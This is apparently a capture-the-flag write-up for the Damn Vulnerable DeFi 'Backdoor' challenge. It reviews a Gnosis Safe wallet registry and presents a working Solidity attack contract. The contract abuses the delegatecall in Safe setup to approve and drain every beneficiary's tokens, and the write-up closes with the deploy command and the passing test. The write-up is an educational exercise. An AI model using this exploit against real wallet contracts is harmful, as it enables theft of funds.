<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/11.png">

# Target Contract Review

Given contract.

**WalletRegistry.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
 *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping(address => bool) public beneficiaries;

    // owner => wallet
    mapping(address => address) public wallets;

    error NotEnoughFunds();
    error CallerNotFactory();
    error FakeMasterCopy();
    error InvalidInitialization();
    error InvalidThreshold(uint256 threshold);
    error InvalidOwnersCount(uint256 count);
    error OwnerIsNotABeneficiary();
    error InvalidFallbackManager(address fallbackManager);

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        _initializeOwner(msg.sender);

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length;) {
            unchecked {
                beneficiaries[initialBeneficiaries[i]] = true;
                ++i;
            }
        }
    }

    function addBeneficiary(address beneficiary) external onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    /**
     * @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
     *          setting the registry's address as the callback.
     */
    function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256)
        external
        override
    {
        if (token.balanceOf(address(this)) < PAYMENT_AMOUNT) { // fail early
            revert NotEnoughFunds();
        }

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        if (msg.sender != walletFactory) {
            revert CallerNotFactory();
        }

        if (singleton != masterCopy) {
            revert FakeMasterCopy();
        }

        // Ensure initial calldata was a call to `GnosisSafe::setup`
        if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {
            revert InvalidInitialization();
        }

        // Ensure wallet initialization is the expected
        uint256 threshold = GnosisSafe(walletAddress).getThreshold();
        if (threshold != EXPECTED_THRESHOLD) {
            revert InvalidThreshold(threshold);
        }

        address[] memory owners = GnosisSafe(walletAddress).getOwners();
        if (owners.length != EXPECTED_OWNERS_COUNT) {
            revert InvalidOwnersCount(owners.length);
        }

        // Ensure the owner is a registered beneficiary
        address walletOwner;
        unchecked {
            walletOwner = owners[0];
        }
        if (!beneficiaries[walletOwner]) {
            revert OwnerIsNotABeneficiary();
        }

        address fallbackManager = _getFallbackManager(walletAddress);
        if (fallbackManager != address(0))
            revert InvalidFallbackManager(fallbackManager);

        // Remove owner as beneficiary
        beneficiaries[walletOwner] = false;

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
    }

    function _getFallbackManager(address payable wallet) private view returns (address) {
        return abi.decode(
            GnosisSafe(wallet).getStorageAt(
                uint256(keccak256("fallback_manager.handler.address")),
                0x20
            ),
            (address)
        );
    }
}
```

The `WalletRegistry` contract is a registry for **Gnosis Safe wallets**. Its purpose is to store and manage the deployment of legitimate Gnosis Safe wallets and distribute a certain amount of tokens to the registered wallets.

**The contract is designed to ensure that only legitimate Gnosis Safe wallets are stored in the registry**. It has embedded verifications and checks to enforce this.

The contract constructor takes the addresses of the `masterCopy` (the Gnosis Safe master copy contract), `walletFactory` (the factory contract used to create Gnosis Safe wallets), token (the ERC20 token contract), and an array of initial beneficiaries.

`addBeneficiary() :` Allows the contract owner to add a new beneficiary to the beneficiaries mapping.

`proxyCreated() :` This function is executed when a user creates a Gnosis Safe wallet using the `GnosisSafeProxyFactory` contract and sets the registry's address as the callback. This function performs various verifications and checks to ensure the wallet is legitimate and then registers the wallet under the owner's address in the `wallets` mapping. It also transfers a certain amount of tokens to the newly created wallet.

`_getFallbackManager() :` Retrieves the fallback manager address of a Gnosis Safe wallet.
 

Overall, the `WalletRegistry` contract provides a secure and controlled environment for deploying and registering Gnosis Safe wallets, ensuring that only legitimate wallets are stored in the registry and distributing tokens to the registered wallets.

Challenge's message:

> To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.
Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
Your goal is to take all funds from the registry. In a single transaction.

# Subverting

As you can see from the challenge's contract, there is only way to get all funds is triggering `proxyCreated()` function. We can **trigger this function by creating a proxy with callback**.

After complete this step, we should pass the following requirement. To skip the condation, **the initial calldata must be called to** `GnosisSafe.setup()`.

```solidity
 if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {
            revert InvalidInitialization();
}
```

When we look at the `setup()` function, only the `setupModules()` is **execute a process with calldata param**. So, keep analyze with this function. 

```solidity
function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {
        // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
        setupOwners(_owners, _threshold);
        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
        // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
        setupModules(to, data);

        if (payment > 0) {
            // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
            // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
            handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
        }
        emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
    }
```

Yes, we find something helpful to us. It calls `execute()` function within the calldata to complete setup. This means, we can **call our fake callback contract and steal all tokens after creating proxy contract with** `createProxyWithCallback()`!

```solidity
function setupModules(address to, bytes memory data) internal {
        require(modules[SENTINEL_MODULES] == address(0), "GS100");
        modules[SENTINEL_MODULES] = SENTINEL_MODULES;
        if (to != address(0))
            // Setup has to complete successfully or transaction fails.
            require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");
    }
```

Let's see attack contract:

```solidity
pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract Callback {
    function callback(address token, address spender, uint256 drainAmount) external {
        IERC20(token).approve(spender, drainAmount);
    }
}


contract AttackBackdoor {
    constructor(address[] memory _users,address _walletRegistry ) {

        Callback callback = new Callback();
        WalletRegistry walletRegistry = WalletRegistry(_walletRegistry);
        IERC20 token = walletRegistry.token();
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());

        for (uint i = 0; i < _users.length;) {       
            address[] memory owners = new address[](1);
            owners[0] = _users[i];
            bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,owners,1, address(callback), abi.encodeWithSelector(Callback.callback.selector, address(token), address(this), 10e18),address(0), address(0), 0, address(0));
            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(walletRegistry.masterCopy(),init, i,IProxyCreationCallback(_walletRegistry));
            require(token.allowance(address(safeProxy), address(this)) == 10e18);
            token.transferFrom(address(safeProxy), msg.sender, 10e18);
            unchecked{++i;}
        }
    }
}
```

The `Callback` contract, our fake callback contract which will called by `WalletRegistry`. Then, it will approve every beneficiary's tokens.

```solidity
contract Callback {
    function callback(address token, address spender, uint256 drainAmount) external {
        IERC20(token).approve(spender, drainAmount);
    }
}
```

Get instances of contracts.

```solidity
Callback callback = new Callback();
WalletRegistry walletRegistry = WalletRegistry(_walletRegistry);
IERC20 token = walletRegistry.token();
GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
```

In this part of the code, we will use `createProxyWithCallback()` to generate new `GnosisSafeProxy` contracts for each beneficiary. These contracts will be initialized with the `init` variable, and a call to the `Callback.callback()` function will be made when the `setupModules()` is executed.

Finally, we will verify if the `Callback` contract is approved accurately. Afterward, we will transfer 10 ether to our account.

```solidity
 for (uint i = 0; i < _users.length;) {       
            address[] memory owners = new address[](1);
            owners[0] = _users[i];
            bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,owners,1, address(callback), abi.encodeWithSelector(Callback.callback.selector, address(token), address(this), 10e18),address(0), address(0), 0, address(0));
            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(walletRegistry.masterCopy(),init, i,IProxyCreationCallback(_walletRegistry));
            require(token.allowance(address(safeProxy), address(this)) == 10e18);
            token.transferFrom(address(safeProxy), msg.sender, 10e18);
            unchecked{++i;}
}
```

Here is the attacker command:

```js
await (await ethers.getContractFactory('AttackBackdoor', player)).deploy(
            users, walletRegistry.address, {gasLimit: 30000000}
);
```

Solve the challenge.

```powershell

  [Challenge] Backdoor
    ✔ Execution (375ms)


  1 passing (4s)

Done in 6.34s.
```

**_by wasny0ps_**
